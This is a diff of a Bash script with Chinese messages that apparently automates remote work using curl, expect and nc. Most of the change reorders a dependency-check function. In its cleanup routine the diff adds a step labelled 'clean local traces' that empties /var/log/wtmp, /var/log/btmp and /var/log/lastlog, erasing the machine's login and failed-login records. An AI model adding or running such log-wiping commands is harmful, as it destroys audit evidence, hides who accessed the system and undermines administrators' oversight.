@@ -112,17 +112,6 @@ function check_single_instance() {
     echo $$ > "$LOCK_FILE"
 }
 
-deps_check() {
-    local deps=("curl" "expect" "nc")
-    for dep in "${deps[@]}"; do
-        if ! command -v "$dep" >/dev/null 2>&1; then
-            error "未找到依赖 $dep."
-            install_tools "$dep" || exit 1
-            #exit 1
-        fi
-    done
-}
-
 install_tools() {
     dep=$1
     echo "安装依赖: $dep"
@@ -154,6 +143,16 @@ install_tools() {
     return 0
 }
 
+deps_check() {
+    local deps=("curl" "expect" "nc")
+    for dep in "${deps[@]}"; do
+        if ! command -v "$dep" >/dev/null 2>&1; then
+            warn "未找到依赖 $dep."
+            install_tools "$dep" || exit 1
+            #exit 1
+        fi
+    done
+}
 
 # 加载配置
 function load_config() {
@@ -1099,6 +1098,11 @@ EOF
         return 1
     else
         info "清理操作完成"
+        
+        info "清理本机痕迹"
+        [ -f /var/log/wtmp ] && echo > /var/log/wtmp
+        [ -f /var/log/btmp ] && echo > /var/log/btmp
+        [ -f /var/log/lastlog ] && echo > /var/log/lastlog
         return 0
     fi
 }
